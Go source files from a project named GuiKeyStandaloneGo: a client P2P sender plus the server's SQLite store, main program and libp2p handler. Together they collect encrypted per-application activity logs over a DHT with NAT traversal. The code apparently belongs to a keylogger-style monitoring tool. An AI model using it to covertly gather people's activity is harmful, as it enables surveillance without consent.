	if err != nil {
		pm.logger.Printf("P2P Client: Failed to subscribe to address update events: %v", err)
		return
	}
	defer addrSub.Close()

	// Subscribe to NAT status change events (reachability events)
	reachabilitySub, err := pm.host.EventBus().Subscribe(new(event.EvtLocalReachabilityChanged))
	if err != nil {
		pm.logger.Printf("P2P Client: Failed to subscribe to reachability events: %v", err)
	} else {
		defer reachabilitySub.Close()
	}

	pm.logger.Printf("P2P Client: Initial Listen Addresses: %v", pm.host.Addrs())

	for {
		select {
		case <-ctx.Done():
			pm.logger.Println("P2P Client: Address/NAT monitor stopping.")
			return
		case ev, ok := <-addrSub.Out():
			if !ok {
				addrSub = nil
				if reachabilitySub == nil {
					return
				}
				continue
			}
			addressEvent := ev.(event.EvtLocalAddressesUpdated)
			// Fixed: Use Current and Diffs instead of Listen (which doesn't exist)
			pm.logger.Printf("P2P Client: Host addresses updated. Current: %v. Diffs: %+v", addressEvent.Current, addressEvent.Diffs)
		case ev, ok := <-reachabilitySub.Out():
			if !ok {
				reachabilitySub = nil
				if addrSub == nil {
					return
				}
				continue
			}
			// Fixed: Use EvtLocalReachabilityChanged instead of autonat.Event
			reachabilityEvent := ev.(event.EvtLocalReachabilityChanged)
			pm.logger.Printf("P2P Client: Reachability status changed: %s", reachabilityEvent.Reachability.String())
		}
	}
}

func (pm *P2PManager) periodicallyFindServer(ctx context.Context) {
	if pm.serverPeerIDStr == "" {
		return
	}
	targetPeerID, err := peer.Decode(pm.serverPeerIDStr)
	if err != nil {
		pm.logger.Printf("P2P Client: Invalid server PeerID for periodic find: %v", err)
		return
	}

	ticker := time.NewTicker(1 * time.Minute) // Check server reachability more often
	defer ticker.Stop()

	// Initial attempt
	pm.findAndConnectToServer(ctx, targetPeerID)

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			pm.findAndConnectToServer(ctx, targetPeerID)
		}
	}
}

func (pm *P2PManager) findAndConnectToServer(ctx context.Context, targetPeerID peer.ID) {
	if pm.host.Network().Connectedness(targetPeerID) == network.Connected {
		return
	}
	pm.logger.Printf("P2P Client: Attempting to find server %s via DHT...", targetPeerID)
	findCtx, findCancel := context.WithTimeout(ctx, 45*time.Second)
	defer findCancel()

	peerInfo, err := pm.kademliaDHT.FindPeer(findCtx, targetPeerID)
	if err != nil {
		pm.logger.Printf("P2P Client: Could not find server %s via DHT: %v", targetPeerID, err)
		return
	}
	pm.logger.Printf("P2P Client: Found server %s via DHT at addrs: %v. Attempting connect.", targetPeerID, peerInfo.Addrs)
	pm.host.Peerstore().AddAddrs(peerInfo.ID, peerInfo.Addrs, 2*time.Hour)

	connectCtx, connectCancel := context.WithTimeout(ctx, 30*time.Second)
	defer connectCancel()
	err = pm.host.Connect(connectCtx, peerInfo)
	if err != nil {
		pm.logger.Printf("P2P Client: Failed to connect to server %s found via DHT: %v", targetPeerID, err)
	} else {
		pm.logger.Printf("P2P Client: Successfully connected to server %s found via DHT.", targetPeerID)
	}
}

func (pm *P2PManager) SendLogBatch(ctx context.Context, clientAppID string, encryptedPayload []byte) (*p2p.LogBatchResponse, error) {
	if pm.serverPeerIDStr == "" {
		return nil, fmt.Errorf("p2p client: server PeerID is not configured")
	}
	targetPeerID, err := peer.Decode(pm.serverPeerIDStr)
	if err != nil {
		return nil, fmt.Errorf("p2p client: invalid server PeerID string '%s': %w", pm.serverPeerIDStr, err)
	}

	pm.logger.Printf("P2P Client: Attempting to open stream to server %s for protocol %s", targetPeerID, p2p.ProtocolID)
	streamCtx, cancelStream := context.WithTimeout(ctx, 30*time.Second)
	defer cancelStream()

	stream, err := pm.host.NewStream(streamCtx, targetPeerID, p2p.ProtocolID)
	if err != nil {
		return nil, fmt.Errorf("p2p client: failed to open new stream to server %s: %w", targetPeerID, err)
	}
	defer stream.Reset()
	pm.logger.Printf("P2P Client: Stream opened to server %s", targetPeerID)

	_ = stream.SetWriteDeadline(time.Now().Add(30 * time.Second))
	_ = stream.SetReadDeadline(time.Now().Add(60 * time.Second))

	response, err := p2p.SendLogBatchAndGetResponse(stream, clientAppID, encryptedPayload)
	if err != nil {
		return nil, fmt.Errorf("p2p client: error during log batch send/receive: %w", err)
	}

	pm.logger.Printf("P2P Client: Received response from server: Status='%s', Msg='%s', Processed=%d",
		response.Status, response.Message, response.EventsProcessed)
	return response, nil
}

func (pm *P2PManager) Close() error {
	// AutoNAT client associated with the host is closed when the host is closed.
	// No explicit autoNATClient.Close() needed.
	if pm.kademliaDHT != nil {
		if err := pm.kademliaDHT.Close(); err != nil {
			pm.logger.Printf("P2P Client: Error closing Kademlia DHT: %v", err)
			// Don't return early, try to close host too
		}
	}
	if pm.host != nil {
		pm.logger.Println("P2P Client: Closing libp2p host...")
		return pm.host.Close()
	}
	return nil
}

func runP2PManager(p2pManager *P2PManager, internalQuit <-chan struct{}, wg *sync.WaitGroup, logger *log.Logger) {
	defer wg.Done()
	// Use the P2PManager's own logger
	p2pManager.logger.Println("P2P Client Manager goroutine starting.")

	p2pCtx, cancelP2pCtx := context.WithCancel(context.Background())
	defer cancelP2pCtx()

	p2pManager.StartDiscoveryAndBootstrap(p2pCtx)

	<-internalQuit
	p2pManager.logger.Println("P2P Client Manager goroutine stopping...")
}

'''
'''--- generator/templates/server_template/log_store_sqlite.go ---
// GuiKeyStandaloneGo/generator/templates/server_template/log_store_sqlite.go
package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"sync"
	"time" // For PruneOldLogs

	"guikeystandalonego/pkg/types" // Shared LogEvent type

	_ "github.com/mattn/go-sqlite3" // SQLite driver
	// For event IDs if needed for querying specific events
)

// Constants for DB Pragmas (can be shared with client if moved to pkg)
const (
	serverDBPragmaWAL         = "PRAGMA journal_mode=WAL;"
	serverDBPragmaBusyTimeout = "PRAGMA busy_timeout = 5000;"
	serverDBPragmaSynchronous = "PRAGMA synchronous = NORMAL;"
)

type ServerLogStore struct {
	db     *sql.DB
	logger *log.Logger
	dbPath string
}

func NewServerLogStore(dbFilePath string, logger *log.Logger) (*ServerLogStore, error) {
	if logger == nil {
		logger = log.New(os.Stdout, "SERVER_LOGSTORE_FALLBACK: ", log.LstdFlags|log.Lshortfile)
	}

	dbDir := filepath.Dir(dbFilePath)
	if err := os.MkdirAll(dbDir, 0755); err != nil {
		return nil, fmt.Errorf("server_logstore: failed to create database directory %s: %w", dbDir, err)
	}

	dsn := fmt.Sprintf("file:%s?cache=shared&mode=rwc", dbFilePath)

	db, err := sql.Open("sqlite3", dsn)
	if err != nil {
		return nil, fmt.Errorf("server_logstore: failed to open SQLite database at %s: %w", dbFilePath, err)
	}

	pragmas := []string{serverDBPragmaWAL, serverDBPragmaBusyTimeout, serverDBPragmaSynchronous}
	for _, pragma := range pragmas {
		if _, errP := db.Exec(pragma); errP != nil {
			logger.Printf("ServerLogStore: Warning - Failed to set pragma '%s': %v", pragma, errP)
		}
	}

	store := &ServerLogStore{
		db:     db,
		logger: logger,
		dbPath: dbFilePath,
	}

	if err := store.initSchema(); err != nil {
		db.Close()
		return nil, fmt.Errorf("server_logstore: failed to initialize schema: %w", err)
	}

	logger.Printf("ServerLogStore: SQLite initialized. DB: %s", dbFilePath)
	return store, nil
}

func (s *ServerLogStore) initSchema() error {
	// Schema is similar to client's, but server might have more complex querying needs later.
	// For now, storing the full LogEvent JSON is fine.
	// Added received_at timestamp for server-side tracking.
	createTableSQL := `
	CREATE TABLE IF NOT EXISTS received_logs (
		event_id TEXT PRIMARY KEY,         -- LogEvent.ID (UUID string) from the client
		client_id TEXT NOT NULL,           -- LogEvent.ClientID (UUID string) from the client
		received_at INTEGER NOT NULL,      -- Timestamp (Unix seconds) when server received/processed this
		event_timestamp INTEGER NOT NULL,  -- Original LogEvent.Timestamp (Unix seconds)
		application_name TEXT,
		initial_window_title TEXT,
		schema_version INTEGER,      
		full_log_event_json TEXT NOT NULL -- Full LogEvent marshaled to JSON
	);
	CREATE INDEX IF NOT EXISTS idx_received_logs_client_id ON received_logs (client_id);
	CREATE INDEX IF NOT EXISTS idx_received_logs_event_timestamp ON received_logs (event_timestamp);
	CREATE INDEX IF NOT EXISTS idx_received_logs_received_at ON received_logs (received_at);
	CREATE INDEX IF NOT EXISTS idx_received_logs_app_name ON received_logs (application_name);
	`
	_, err := s.db.Exec(createTableSQL)
	if err != nil {
		return fmt.Errorf("server_logstore: failed to create received_logs table: %w", err)
	}
	s.logger.Println("ServerLogStore: SQLite schema initialized/verified.")
	return nil
}

// AddReceivedLogEvents stores a batch of LogEvents received from a client.
func (s *ServerLogStore) AddReceivedLogEvents(events []types.LogEvent, receivedTime time.Time) (int, error) {
	if len(events) == 0 {
		return 0, nil
	}

	tx, err := s.db.Begin()
	if err != nil {
		return 0, fmt.Errorf("server_logstore: failed to begin transaction: %w", err)
	}

	stmt, err := tx.Prepare(`
		INSERT INTO received_logs (
			event_id, client_id, received_at, event_timestamp, 
			application_name, initial_window_title, schema_version, full_log_event_json
		) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
		ON CONFLICT(event_id) DO NOTHING`) // Gracefully handle duplicate event IDs from client
	if err != nil {
		tx.Rollback()
		return 0, fmt.Errorf("server_logstore: failed to prepare insert statement: %w", err)
	}
	defer stmt.Close()

	insertedCount := 0
	for _, event := range events {
		jsonData, jsonErr := json.Marshal(event)
		if jsonErr != nil {
			s.logger.Printf("ServerLogStore: Error marshaling event ID %s to JSON, skipping: %v", event.ID, jsonErr)
			continue // Skip this event
		}

		res, execErr := stmt.Exec(
			event.ID.String(),
			event.ClientID.String(),
			receivedTime.Unix(),
			event.Timestamp.Unix(),
			event.ApplicationName,
			event.InitialWindowTitle,
			event.SchemaVersion,
			string(jsonData),
		)
		if execErr != nil {
			// Log individual error, but continue, then rollback if any failed.
			s.logger.Printf("ServerLogStore: Error inserting event ID %s: %v", event.ID, execErr)
			// For now, let's rollback on any error in the batch
			tx.Rollback()
			return insertedCount, fmt.Errorf("server_logstore: error inserting event ID %s (rolled back): %w", event.ID, execErr)
		}
		affected, _ := res.RowsAffected()
		if affected > 0 {
			insertedCount++
		}
	}

	if err = tx.Commit(); err != nil {
		return insertedCount, fmt.Errorf("server_logstore: failed to commit transaction: %w", err)
	}

	s.logger.Printf("ServerLogStore: Added %d new log events to DB (out of %d received).", insertedCount, len(events))
	return insertedCount, nil
}

// GetLogEventsPaginated retrieves logs for the web UI.
func (s *ServerLogStore) GetLogEventsPaginated(page uint, pageSize uint) ([]types.LogEvent, int64, error) {
	offset := (page - 1) * pageSize

	// Get total count first for pagination info
	var totalCount int64
	err := s.db.QueryRow("SELECT COUNT(*) FROM received_logs").Scan(&totalCount)
	if err != nil {
		return nil, 0, fmt.Errorf("server_logstore: failed to count total logs: %w", err)
	}

	if totalCount == 0 {
		return []types.LogEvent{}, 0, nil
	}

	rows, err := s.db.Query(
		"SELECT full_log_event_json FROM received_logs ORDER BY event_timestamp DESC LIMIT ? OFFSET ?",
		pageSize,
		offset,
	)
	if err != nil {
		return nil, totalCount, fmt.Errorf("server_logstore: failed to query paginated logs: %w", err)
	}
	defer rows.Close()

	var events []types.LogEvent
	for rows.Next() {
		var jsonData string
		if err := rows.Scan(&jsonData); err != nil {
			s.logger.Printf("ServerLogStore: Error scanning log for UI: %v", err)
			continue
		}
		var event types.LogEvent
		if err := json.Unmarshal([]byte(jsonData), &event); err != nil {
			s.logger.Printf("ServerLogStore: Error unmarshaling log for UI (Data: %.50s...): %v", jsonData, err)
			continue
		}
		events = append(events, event)
	}
	if err = rows.Err(); err != nil {
		return nil, totalCount, fmt.Errorf("server_logstore: error iterating paginated log rows: %w", err)
	}
	return events, totalCount, nil
}

// PruneOldLogs for the server
func (s *ServerLogStore) PruneOldLogs(retentionDays uint32) (int64, error) {
	if retentionDays == 0 {
		s.logger.Println("ServerLogStore: Log retention is indefinite (0 days), skipping pruning.")
		return 0, nil
	}

	cutoffTime := time.Now().Add(-time.Duration(retentionDays) * 24 * time.Hour)
	// Prune based on original client event_timestamp for consistency, or received_at for server policy
	cutoffTimestampUnix := cutoffTime.Unix()

	s.logger.Printf("ServerLogStore: Pruning logs older than %d days (event_timestamp before %s / %d).",
		retentionDays, cutoffTime.Format(time.RFC3339), cutoffTimestampUnix)

	result, err := s.db.Exec("DELETE FROM received_logs WHERE event_timestamp < ?", cutoffTimestampUnix)
	if err != nil {
		return 0, fmt.Errorf("server_logstore: failed to execute prune old logs query: %w", err)
	}
	rowsAffected, _ := result.RowsAffected() // Error check on RowsAffected is less critical
	if rowsAffected > 0 {
		s.logger.Printf("ServerLogStore: Pruned %d old log entries.", rowsAffected)
	} else {
		s.logger.Println("ServerLogStore: No old log entries found to prune based on event_timestamp.")
	}
	return rowsAffected, nil
}

func (s *ServerLogStore) Close() error {
	if s.db != nil {
		s.logger.Println("ServerLogStore: Closing database connection.")
		return s.db.Close()
	}
	return nil
}

// runServerLogStoreManager (optional, if server store needs background tasks like pruning)
func runServerLogStoreManager(
	logStore *ServerLogStore,
	internalQuit <-chan struct{},
	wg *sync.WaitGroup,
	retentionDays uint32,
	pruneInterval time.Duration,
) {
	defer wg.Done()
	logStore.logger.Println("Server LogStore Manager goroutine started.")

	if retentionDays == 0 || pruneInterval == 0 {
		logStore.logger.Println("Server LogStore Manager: Pruning disabled (retention or interval is 0).")
		<-internalQuit // Block until quit
		logStore.logger.Println("Server LogStore Manager goroutine stopping (pruning was disabled).")
		return
	}

	pruneTicker := time.NewTicker(pruneInterval)
	defer pruneTicker.Stop()

	for {
		select {
		case <-pruneTicker.C:
			logStore.logger.Println("Server LogStore Manager: Running periodic log pruning...")
			_, err := logStore.PruneOldLogs(retentionDays)
			if err != nil {
				logStore.logger.Printf("Server LogStore Manager: Error during periodic log pruning: %v", err)
			}
		case <-internalQuit:
			logStore.logger.Println("Server LogStore Manager goroutine stopping.")
			return
		}
	}
}

'''
'''--- generator/templates/server_template/main.go ---
// GuiKeyStandaloneGo/generator/templates/server_template/main.go
package main

import (
	"context"
	"fmt"
	"log"
	"net/http" // For Web UI
	"os"
	"os/signal"
	"path/filepath"
	"sync"
	"syscall"
	"time"

	_ "github.com/mattn/go-sqlite3" // SQLite driver for side effects
)

var serverGlobalLogger *log.Logger

func setupServerLogger() {
	// Use embedded configuration constants
	logFileName := CfgInternalLogFileName
	logDir := CfgInternalLogFileDir

	absLogDir := logDir
	if !filepath.IsAbs(logDir) {
		exePath, err := os.Executable()
		if err != nil {
			fmt.Fprintf(os.Stderr, "SERVER CRITICAL: Cannot get executable path for logger: %v. Using current directory for logs.\n", err)
			absLogDir = "." // Fallback
		} else {
			absLogDir = filepath.Join(filepath.Dir(exePath), logDir)
		}
	}

	if err := os.MkdirAll(absLogDir, 0755); err != nil {
		// Attempt to log to a fallback file in current directory if specified dir fails
		fallbackFile, ferr := os.OpenFile("server_critical_setup.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if ferr == nil {
			log.SetOutput(fallbackFile) // Switch standard log's output
			defer fallbackFile.Close()
		}
		log.Fatalf("SERVER CRITICAL: Failed to create server log directory %s: %v", absLogDir, err)
	}

	logPath := filepath.Join(absLogDir, logFileName)
	file, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatalf("SERVER CRITICAL: Failed to open server log file %s: %v", logPath, err)
	}
	serverGlobalLogger = log.New(file, "SERVER: ", log.LstdFlags|log.Lshortfile)
	serverGlobalLogger.Printf("Server logger initialized (Level: %s). Log file: %s", CfgInternalLogLevel, logPath)
}

func main() {
	// config_generated.go (in this package) defines Cfg... constants
	setupServerLogger() // Initializes serverGlobalLogger

	serverGlobalLogger.Printf("Local Log Server starting. Version: DEV. (Embedded Config Active)")
	serverGlobalLogger.Printf("P2P Listen Address: %s", CfgP2PListenAddress)
	serverGlobalLogger.Printf("Web UI Listen Address: %s", CfgWebUIListenAddress)
	serverGlobalLogger.Printf("Database Path: %s", CfgDatabasePath)
	serverGlobalLogger.Printf("Log Retention Days: %d", CfgLogRetentionDays)
	serverGlobalLogger.Printf("Server Bootstrap Addresses: %v", CfgBootstrapAddresses)

	// Initialize ServerLogStore
	dbPathServer := CfgDatabasePath
	if !filepath.IsAbs(dbPathServer) {
		exePath, err := os.Executable()
		if err != nil {
			serverGlobalLogger.Fatalf("SERVER CRITICAL: Failed to get executable path for DB: %v", err)
		}
		dbPathServer = filepath.Join(filepath.Dir(exePath), CfgDatabasePath)
	}
	serverLogStore, err := NewServerLogStore(dbPathServer, serverGlobalLogger)
	if err != nil {
		serverGlobalLogger.Fatalf("SERVER CRITICAL: Failed to initialize ServerLogStore: %v", err)
	}
	defer func() {
		if errClose := serverLogStore.Close(); errClose != nil {
			serverGlobalLogger.Printf("Error closing ServerLogStore: %v", errClose)
		}
	}()

	// Initialize ServerP2PManager
	serverP2PMan, err := NewServerP2PManager(
		serverGlobalLogger,
		CfgP2PListenAddress,
		CfgServerIdentityKeySeedHex,
		CfgBootstrapAddresses, // Use generated bootstrap addresses
		serverLogStore,
		CfgEncryptionKeyHex,
	)
	if err != nil {
		serverGlobalLogger.Fatalf("SERVER CRITICAL: Failed to initialize ServerP2PManager: %v", err)
	}
	defer serverP2PMan.Close()

	// Load HTML templates for Web UI
	exePath, _ := os.Executable() // Assuming success as it's used before
	// Templates are expected to be in a 'web_templates' subdirectory relative to the executable
	// This path is where the generator copies them.
	templateDir := filepath.Join(filepath.Dir(exePath), "web_templates")
	if err := LoadTemplates(templateDir, serverGlobalLogger); err != nil {
		serverGlobalLogger.Fatalf("SERVER CRITICAL: Failed to load HTML templates from %s: %v", templateDir, err)
	}

	// --- Channels & WaitGroup for graceful shutdown ---
	osQuitChan := make(chan os.Signal, 1)
	signal.Notify(osQuitChan, syscall.SIGINT, syscall.SIGTERM)
	internalQuitChan := make(chan struct{})
	var wg sync.WaitGroup

	// --- Start Server Goroutines ---
	// P2P Manager
	wg.Add(1)
	go runServerP2PManager(serverP2PMan, internalQuitChan, &wg, serverGlobalLogger)

	// LogStore Manager (for pruning etc.)
	wg.Add(1)
	pruneInterval := time.Duration(CfgLogDeletionCheckIntervalHrs) * time.Hour
	if CfgLogDeletionCheckIntervalHrs == 0 { 
		pruneInterval = 24 * 365 * time.Hour // Effectively disable
		serverGlobalLogger.Println("Server LogStore pruning disabled (interval is 0).")
	}
	go runServerLogStoreManager(serverLogStore, internalQuitChan, &wg, CfgLogRetentionDays, pruneInterval)

	// Web UI HTTP Server
	webUIEnv := &WebUIEnv{
		LogStore:     serverLogStore,
		ServerPeerID: serverP2PMan.host.ID().String(),
		Logger:       serverGlobalLogger,
	}
	mux := http.NewServeMux()
	mux.HandleFunc("/", indexHandler)
	mux.HandleFunc("/logs", webUIEnv.viewLogsHandler)

	// Static files are expected to be in a 'static' subdirectory relative to the executable
	staticFileDir := filepath.Join(filepath.Dir(exePath), "static")
	fileServer := http.FileServer(http.Dir(staticFileDir))
	mux.Handle("/static/", http.StripPrefix("/static/", fileServer))
	
	httpServer := &http.Server{
		Addr:    CfgWebUIListenAddress,
		Handler: mux,
		ReadTimeout:  10 * time.Second,
        WriteTimeout: 10 * time.Second,
        IdleTimeout:  120 * time.Second,
	}

	wg.Add(1) // For the HTTP server listener goroutine
	go func() {
		defer wg.Done()
		serverGlobalLogger.Printf("Web UI server starting to listen on http://%s", CfgWebUIListenAddress)
		if errSrv := httpServer.ListenAndServe(); errSrv != nil && errSrv != http.ErrServerClosed {
			serverGlobalLogger.Fatalf("Web UI ListenAndServe error: %v", errSrv)
		}
		serverGlobalLogger.Println("Web UI server listener stopped.")
	}()
	
	// Goroutine to handle graceful shutdown of HTTP server
	go func() {
		<-internalQuitChan 
		serverGlobalLogger.Println("Web UI server: Shutdown signal received, attempting graceful shutdown...")
		shutdownCtx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()
		if errShutdown := httpServer.Shutdown(shutdownCtx); errShutdown != nil {
			serverGlobalLogger.Printf("Web UI server graceful shutdown error: %v", errShutdown)
		}
		serverGlobalLogger.Println("Web UI server shut down.")
	}()

	serverGlobalLogger.Println("Server main components initialized. Waiting for shutdown signal...")
	<-osQuitChan
	serverGlobalLogger.Println("OS shutdown signal received. Signaling goroutines to stop...")
	close(internalQuitChan)
	serverGlobalLogger.Println("Waiting for server goroutines to complete...")
	wg.Wait()
	serverGlobalLogger.Println("All server components shut down gracefully.")
}
'''
'''--- generator/templates/server_template/p2p_manager.go ---
// GuiKeyStandaloneGo/generator/templates/server_template/p2p_manager.go
package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"os"
	"sync"
	"time"

	pkgCrypto "guikeystandalonego/pkg/crypto"
	"guikeystandalonego/pkg/p2p"
	"guikeystandalonego/pkg/types"

	"github.com/libp2p/go-libp2p"
	dht "github.com/libp2p/go-libp2p-kad-dht"
	"github.com/libp2p/go-libp2p/core/event"
	"github.com/libp2p/go-libp2p/core/host"
	"github.com/libp2p/go-libp2p/core/network"
	"github.com/libp2p/go-libp2p/core/peer"
	coreRouting "github.com/libp2p/go-libp2p/core/routing"
	routd "github.com/libp2p/go-libp2p/p2p/discovery/routing"

	// AutoNAT import not explicitly needed if using libp2p.EnableNATService() option
	"github.com/multiformats/go-multiaddr"
)

const ServerRendezvousString = "guikey-standalone-logserver/v1.0.0" // Versioned rendezvous

type ServerP2PManager struct {
	host               host.Host
	kademliaDHT        *dht.IpfsDHT
	routingDiscovery   *routd.RoutingDiscovery
	logger             *log.Logger
	serverLogStore     *ServerLogStore
	encryptionKeyHex   string
	bootstrapAddrInfos []peer.AddrInfo
}

func NewServerP2PManager(
	logger *log.Logger,
	listenAddrStr string,
	identitySeedHex string,
	bootstrapAddrs []string,
	serverLogStore *ServerLogStore,
	appEncryptionKeyHex string,
) (*ServerP2PManager, error) {
	if logger == nil {
		logger = log.New(os.Stdout, "SERVER_P2P_FALLBACK: ", log.LstdFlags|log.Lshortfile)
	}

	privKey, _, err := pkgCrypto.Libp2pKeyFromSeedHex(identitySeedHex)
	if err != nil {
		return nil, fmt.Errorf("server_p2p: failed to create identity from seed: %w", err)
	}

	var bootAddrsInfo []peer.AddrInfo
	for _, addrStr := range bootstrapAddrs {
		if addrStr == "" {
			continue
		}
		ai, errParse := peer.AddrInfoFromString(addrStr)
		if errParse != nil {
			logger.Printf("Server P2P WARN: Invalid bootstrap address string '%s': %v", addrStr, errParse)
			continue
		}
		bootAddrsInfo = append(bootAddrsInfo, *ai)
	}

	var opts []libp2p.Option
	opts = append(opts, libp2p.Identity(privKey))

	listenMA, err := multiaddr.NewMultiaddr(listenAddrStr)
	if err != nil {
		return nil, fmt.Errorf("server_p2p: invalid listen multiaddress '%s': %w", listenAddrStr, err)
	}
	opts = append(opts, libp2p.ListenAddrs(listenMA))

	opts = append(opts, libp2p.EnableRelay())
	opts = append(opts, libp2p.EnableHolePunching())
	opts = append(opts, libp2p.EnableNATService()) // Fixed: EnableAutoNAT() -> EnableNATService()
	opts = append(opts, libp2p.NATPortMap())

	var kadDHT *dht.IpfsDHT
	opts = append(opts,
		libp2p.Routing(func(h host.Host) (coreRouting.PeerRouting, error) {
			var dhtErr error
			dhtOpts := []dht.Option{dht.Mode(dht.ModeServer)}
			if len(bootAddrsInfo) > 0 {
				dhtOpts = append(dhtOpts, dht.BootstrapPeers(bootAddrsInfo...))
			}
			kadDHT, dhtErr = dht.New(context.Background(), h, dhtOpts...)
			return kadDHT, dhtErr
		}),
	)

	p2pHost, err := libp2p.New(opts...)
	if err != nil {
		return nil, fmt.Errorf("server_p2p: failed to create libp2p host: %w", err)
	}
	logger.Printf("Server P2P: Host created. ID: %s", p2pHost.ID().String())

	if kadDHT == nil {
		p2pHost.Close()
		return nil, fmt.Errorf("server_p2p: Kademlia DHT was not initialized")
	}
	logger.Println("Server P2P: Kademlia DHT initialized.")

	routingDiscovery := routd.NewRoutingDiscovery(kadDHT)

	p2pHost.SetStreamHandler(p2p.ProtocolID, func(stream network.Stream) {
		handleIncomingLogStream(stream, logger, serverLogStore, appEncryptionKeyHex)
	})
	logger.Printf("Server P2P: Stream handler set for protocol ID: %s", p2p.ProtocolID)

	return &ServerP2PManager{
		host:               p2pHost,
		kademliaDHT:        kadDHT,
		routingDiscovery:   routingDiscovery,
		logger:             logger,
		serverLogStore:     serverLogStore,
		encryptionKeyHex:   appEncryptionKeyHex,
		bootstrapAddrInfos: bootAddrsInfo,
	}, nil
}

func (pm *ServerP2PManager) StartBootstrapAndDiscovery(ctx context.Context) {
	pm.logger.Println("Server P2P: Starting bootstrap, discovery, and advertising processes...")
	if len(pm.bootstrapAddrInfos) > 0 {
		pm.logger.Printf("Server P2P: Connecting to %d bootstrap peers...", len(pm.bootstrapAddrInfos))
		var wg sync.WaitGroup
		for _, pi := range pm.bootstrapAddrInfos {
			if pm.host.Network().Connectedness(pi.ID) == network.Connected {
				continue
			}
			wg.Add(1)
			go func(peerInfo peer.AddrInfo) {
				defer wg.Done()
				connectCtx, cancel := context.WithTimeout(ctx, 30*time.Second)
				defer cancel()
				if err := pm.host.Connect(connectCtx, peerInfo); err != nil {
					// pm.logger.Printf("Server P2P: Failed to connect to bootstrap peer %s: %v", peerInfo.ID, err)
				} else {
					pm.logger.Printf("Server P2P: Successfully connected to bootstrap peer: %s", peerInfo.ID.String())
				}
			}(pi)
		}
	} else {
		pm.logger.Println("Server P2P: No bootstrap peers configured for server.")
	}

	pm.logger.Println("Server P2P: Bootstrapping Kademlia DHT...")
	go func() { // Run bootstrap in a goroutine
		// Give initial connections to bootstrap nodes a moment.
		select {
		case <-time.After(10 * time.Second):
		case <-ctx.Done():
			return
		}

		if err := pm.kademliaDHT.Bootstrap(ctx); err != nil {
			pm.logger.Printf("Server P2P: Kademlia DHT bootstrap process failed: %v", err)
		} else {
			pm.logger.Println("Server P2P: Kademlia DHT bootstrap process completed/initiated.")
			pm.startAdvertising(ctx) // Start advertising after bootstrap
		}
	}()

	go pm.monitorAddressAndNATChanges(ctx)
}

func (pm *ServerP2PManager) startAdvertising(ctx context.Context) {
	if pm.routingDiscovery == nil {
		pm.logger.Println("Server P2P: RoutingDiscovery not initialized, cannot advertise.")
		return
	}
	pm.logger.Printf("Server P2P: Starting to advertise self on DHT with rendezvous string: %s", ServerRendezvousString)

	// Initial advertisement - Using simple Advertise method without options
	_, err := pm.routingDiscovery.Advertise(ctx, ServerRendezvousString)
	if err != nil {
		pm.logger.Printf("Server P2P: Error on initial advertisement: %v", err)
	} else {
		pm.logger.Printf("Server P2P: Successfully performed initial advertisement for %s", ServerRendezvousString)
	}

	advertiseTicker := time.NewTicker(5 * time.Minute)
	defer advertiseTicker.Stop()
	for {
		select {
		case <-ctx.Done():
			pm.logger.Println("Server P2P: Stopping advertisement due to context cancellation.")
			return
		case <-advertiseTicker.C:
			pm.logger.Printf("Server P2P: Re-advertising self on DHT: %s", ServerRendezvousString)
			// Re-advertise without TTL options
			_, errD := pm.routingDiscovery.Advertise(ctx, ServerRendezvousString)
			if errD != nil {
				pm.logger.Printf("Server P2P: Error re-advertising self on DHT: %v", errD)
			}
		}
	}
}

func (pm *ServerP2PManager) monitorAddressAndNATChanges(ctx context.Context) {
	addrSub, err := pm.host.EventBus().Subscribe(new(event.EvtLocalAddressesUpdated))
	if err != nil {
		pm.logger.Printf("Server P2P: Failed to subscribe to address update events: %v", err)
		return
	}
	defer addrSub.Close()

	reachabilitySub, err := pm.host.EventBus().Subscribe(new(event.EvtLocalReachabilityChanged))
	if err != nil {
		pm.logger.Printf("Server P2P: Failed to subscribe to reachability events: %v", err)
	} else {
		defer reachabilitySub.Close()
	}

	pm.logger.Printf("Server P2P: Initial Listen Addresses: %v", pm.host.Addrs())

	for {
		select {
		case <-ctx.Done():
			pm.logger.Println("Server P2P: Address/NAT monitor stopping.")
			return
		case ev, ok := <-addrSub.Out():
			if !ok {
				addrSub = nil
				if reachabilitySub == nil {
					return
				}
				continue
			}
			addressEvent := ev.(event.EvtLocalAddressesUpdated)
			pm.logger.Printf("Server P2P: Host addresses updated. Current: %v, Diffs: %+v", addressEvent.Current, addressEvent.Diffs)
		case ev, ok := <-reachabilitySub.Out():
			if !ok {
				reachabilitySub = nil
				if addrSub == nil {
					return
				}
				continue
			}
			reachabilityEvent := ev.(event.EvtLocalReachabilityChanged)
			pm.logger.Printf("Server P2P: Reachability status changed to: %s", reachabilityEvent.Reachability.String())
		}
	}
}

func handleIncomingLogStream(stream network.Stream, logger *log.Logger, store *ServerLogStore, encryptionKeyHex string) {
	remotePeer := stream.Conn().RemotePeer()
	logger.Printf("Server P2P: Received new log stream from: %s", remotePeer.String())
	defer func() {
		stream.Reset()
		logger.Printf("Server P2P: Closed log stream from: %s", remotePeer.String())
	}()

	_ = stream.SetReadDeadline(time.Now().Add(60 * time.Second))
	_ = stream.SetWriteDeadline(time.Now().Add(30 * time.Second))

	var request p2p.LogBatchRequest
	if err := p2p.ReadMessage(stream, &request); err != nil {
		if err == io.EOF {
			logger.Printf("Server P2P: Stream from %s closed by remote before full request (EOF).", remotePeer)
		} else {
			logger.Printf("Server P2P: Error reading LogBatchRequest from %s: %v", remotePeer, err)
		}
		return
	}
	logger.Printf("Server P2P: Received LogBatchRequest from ClientAppID: %s, PayloadSize: %d bytes", request.AppClientID, len(request.EncryptedLogPayload))

	decryptedJSON, err := pkgCrypto.Decrypt(request.EncryptedLogPayload, encryptionKeyHex)
	if err != nil {
		logger.Printf("Server P2P: Failed to decrypt payload from %s (ClientAppID: %s): %v", remotePeer, request.AppClientID, err)
		resp := p2p.LogBatchResponse{Status: "error", Message: "Decryption failed on server.", ServerTimestamp: time.Now().Unix()}
		if wErr := p2p.WriteMessage(stream, &resp); wErr != nil {
